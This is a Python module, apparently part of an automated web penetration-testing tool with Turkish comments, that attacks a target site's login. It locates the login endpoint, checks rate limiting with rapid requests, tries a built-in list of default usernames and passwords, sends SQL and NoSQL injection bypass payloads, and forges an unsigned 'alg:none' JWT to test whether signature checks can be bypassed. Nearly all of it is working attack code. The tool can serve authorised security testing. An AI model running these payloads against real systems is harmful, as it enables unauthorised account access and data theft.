import os
import re
import json
import time
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor
from core.engine import run_cmd
from config import TOOL_PATHS

DEFAULT_CREDS = [
    ('admin',     'admin'),
    ('admin',     'password'),
    ('admin',     'admin123'),
    ('admin',     '123456'),
    ('admin',     'test'),
    ('admin',     ''),
    ('test',      'test'),
    ('test',      'password'),
    ('root',      'root'),
    ('root',      'toor'),
    ('user',      'user'),
    ('guest',     'guest'),
    ('admin',     'admin@123'),
    ('superadmin','superadmin'),
    ('administrator', 'administrator'),
]

SQL_BYPASS_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin'--",
    "admin' #",
    "' OR 'x'='x",
    "') OR ('1'='1",
    "1' OR '1' = '1']]}--",
]

NOSQL_BYPASS_PAYLOADS = [
    {'$gt': ''},
    {'$ne': None},
    {'$regex': '.*'},
    {'$where': '1==1'},
]


def find_login_endpoint(base_url: str) -> str | None:
    """Login endpoint'ini bul."""
    candidates = [
        '/api/auth/login',
        '/api/login',
        '/api/v1/auth/login',
        '/auth/login',
        '/login',
        '/api/user/login',
        '/api/signin',
    ]
    for path in candidates:
        try:
            r = subprocess.run(
                ['curl', '-s', '-o', '/dev/null', '-w', '%{http_code}',
                 '-X', 'POST',
                 '-H', 'Content-Type: application/json',
                 '-d', '{}',
                 f"{base_url}{path}"],
                capture_output=True, text=True, timeout=10,
            )
            if r.stdout.strip() not in ('404', '000', ''):
                return path
        except Exception:
            pass
    return None


def rate_limit_check(login_url: str) -> dict:
    """Rate limiting var mı — 20 hızlı istek gönder."""
    results   = {'blocked': False, 'attempts': 0, 'block_at': None}
    blocked   = False

    def single_request(i):
        try:
            r = subprocess.run(
                ['curl', '-s', '-o', '/dev/null', '-w', '%{http_code}',
                 '-X', 'POST',
                 '-H', 'Content-Type: application/json',
                 '-d', json.dumps({'username': f'test{i}', 'password': 'wrongpass'}),
                 login_url],
                capture_output=True, text=True, timeout=10,
            )
            return i, r.stdout.strip()
        except Exception:
            return i, '000'

    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = [ex.submit(single_request, i) for i in range(20)]
        for f in futures:
            i, status = f.result()
            results['attempts'] += 1
            if status in ('429', '403', '423'):
                results['blocked'] = True
                results['block_at'] = i
                break

    if not results['blocked']:
        results['note'] = 'No rate limiting detected — brute force possible'
        results['severity'] = 'HIGH'
    else:
        results['severity'] = 'INFO'

    return results


def default_creds_check(login_url: str) -> list[dict]:
    """Default credentials dene."""
    findings = []

    for username, password in DEFAULT_CREDS:
        for email_field in ['email', 'username']:
            try:
                payload = {email_field: username, 'password': password}
                r = subprocess.run(
                    ['curl', '-s',
                     '-X', 'POST',
                     '-H', 'Content-Type: application/json',
                     '-d', json.dumps(payload),
                     login_url],
                    capture_output=True, text=True, timeout=10,
                )
                body = r.stdout
                if any(kw in body.lower() for kw in [
                    '"success":true', '"token":', '"access_token":', 'logged in'
                ]):
                    findings.append({
                        'url':      login_url,
                        'username': username,
                        'password': password,
                        'field':    email_field,
                        'severity': 'CRITICAL',
                        'type':     'Default Credentials',
                        'response': body[:200],
                    })
                    return findings  # Bulunca dur
                time.sleep(0.1)
            except Exception:
                pass

    return findings


def sql_auth_bypass(login_url: str) -> list[dict]:
    """SQL injection auth bypass dene."""
    findings = []

    for payload in SQL_BYPASS_PAYLOADS:
        for field in ['email', 'username']:
            try:
                data = {field: payload, 'password': 'anything'}
                r = subprocess.run(
                    ['curl', '-s',
                     '-X', 'POST',
                     '-H', 'Content-Type: application/json',
                     '-d', json.dumps(data),
                     login_url],
                    capture_output=True, text=True, timeout=10,
                )
                body = r.stdout

                if any(kw in body.lower() for kw in [
                    '"success":true', '"token":', 'logged in', '"user":'
                ]):
                    findings.append({
                        'url':      login_url,
                        'payload':  payload,
                        'field':    field,
                        'severity': 'CRITICAL',
                        'type':     'SQL Auth Bypass',
                        'response': body[:200],
                    })
                elif 'güvenlik ihlali' in body.lower() or 'security' in body.lower():
                    findings.append({
                        'url':      login_url,
                        'payload':  payload,
                        'field':    field,
                        'severity': 'MEDIUM',
                        'type':     'WAF/Filter Detected',
                        'note':     'Input filtered but endpoint exists',
                    })
                time.sleep(0.1)
            except Exception:
                pass

    return findings


def nosql_auth_bypass(login_url: str) -> list[dict]:
    """NoSQL injection auth bypass dene."""
    findings = []

    for payload in NOSQL_BYPASS_PAYLOADS:
        try:
            data = {'username': payload, 'password': payload}
            r = subprocess.run(
                ['curl', '-s',
                 '-X', 'POST',
                 '-H', 'Content-Type: application/json',
                 '-d', json.dumps(data),
                 login_url],
                capture_output=True, text=True, timeout=10,
            )
            body = r.stdout
            if any(kw in body.lower() for kw in ['"success":true', '"token":']):
                findings.append({
                    'url':      login_url,
                    'payload':  str(payload),
                    'severity': 'CRITICAL',
                    'type':     'NoSQL Auth Bypass',
                    'response': body[:200],
                })
            time.sleep(0.1)
        except Exception:
            pass

    return findings


def jwt_analyze(token: str, url: str) -> list[dict]:
    """JWT token analiz et."""
    findings = []
    if not token:
        return findings

    try:
        parts = token.split('.')
        if len(parts) != 3:
            return findings

        # Header decode
        header_b64 = parts[0] + '=' * (4 - len(parts[0]) % 4)
        header = json.loads(base64.b64decode(header_b64))

        alg = header.get('alg', '')

        if alg == 'none':
            findings.append({
                'type':     'JWT alg:none',
                'severity': 'CRITICAL',
                'note':     'JWT algorithm is none — signature not verified',
            })

        if alg in ('HS256', 'HS384', 'HS512'):
            findings.append({
                'type':     'JWT Weak Algorithm',
                'severity': 'MEDIUM',
                'note':     f'Symmetric algorithm {alg} — secret may be brute-forced',
            })

        # Payload decode
        payload_b64 = parts[1] + '=' * (4 - len(parts[1]) % 4)
        payload = json.loads(base64.b64decode(payload_b64))

        exp = payload.get('exp', 0)
        if exp > 0:
            import datetime
            exp_dt = datetime.datetime.fromtimestamp(exp)
            if exp_dt > datetime.datetime.now() + datetime.timedelta(days=365):
                findings.append({
                    'type':     'JWT Long Expiry',
                    'severity': 'MEDIUM',
                    'note':     f'Token expires: {exp_dt} — very long lived',
                })

        # alg:none bypass dene
        none_header = base64.b64encode(
            json.dumps({'alg': 'none', 'typ': 'JWT'}).encode()
        ).decode().rstrip('=')
        none_token = f"{none_header}.{parts[1]}."

        r = subprocess.run(
            ['curl', '-s', '-w', '\n%{http_code}',
             '-H', f'Authorization: Bearer {none_token}',
             url],
            capture_output=True, text=True, timeout=10,
        )
        resp_parts = r.stdout.rsplit('\n', 1)
        sc = resp_parts[1].strip() if len(resp_parts) > 1 else '0'
        if sc == '200':
            findings.append({
                'type':     'JWT alg:none Bypass Successful',
                'severity': 'CRITICAL',
                'token':    none_token[:50] + '...',
            })

    except Exception:
        pass

    return findings


def run_auth_test(
    target: str,
    alive_hosts: list[str],
    progress_cb=None,
) -> dict:
    results = {
        'login_endpoint':   None,
        'rate_limit':       {},
        'default_creds':    [],
        'sql_bypass':       [],
        'nosql_bypass':     [],
        'jwt_findings':     [],
    }

    def upd(name, status, pct):
        if progress_cb:
            progress_cb(name, status, pct)

    base_url = f"https://{target}"

    # Login endpoint bul
    upd('login_find', 'running', 0.0)
    login_path = find_login_endpoint(base_url)
    results['login_endpoint'] = login_path
    upd('login_find', 'done', 1.0)

    if not login_path:
        for name in ['rate_limit', 'default_creds', 'sql_bypass', 'nosql_bypass']:
            upd(name, 'skip', 1.0)
        return results

    login_url = f"{base_url}{login_path}"

    # Paralel testler
    upd('rate_limit',    'running', 0.0)
    upd('default_creds', 'running', 0.0)
    upd('sql_bypass',    'running', 0.0)
    upd('nosql_bypass',  'running', 0.0)

    from concurrent.futures import ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=4) as ex:
        f1 = ex.submit(rate_limit_check,    login_url)
        f2 = ex.submit(default_creds_check, login_url)
        f3 = ex.submit(sql_auth_bypass,     login_url)
        f4 = ex.submit(nosql_auth_bypass,   login_url)

        results['rate_limit']    = f1.result(); upd('rate_limit',    'done', 1.0)
        results['default_creds'] = f2.result(); upd('default_creds', 'done', 1.0)
        results['sql_bypass']    = f3.result(); upd('sql_bypass',    'done', 1.0)
        results['nosql_bypass']  = f4.result(); upd('nosql_bypass',  'done', 1.0)

    return results